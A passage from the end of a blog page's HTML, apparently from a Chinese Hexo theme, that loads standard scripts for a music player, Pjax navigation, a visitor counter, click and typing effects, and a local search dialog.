})()</script></div><script async data-pjax src="/js/anzhiyu.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"]):not([href="/music/"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>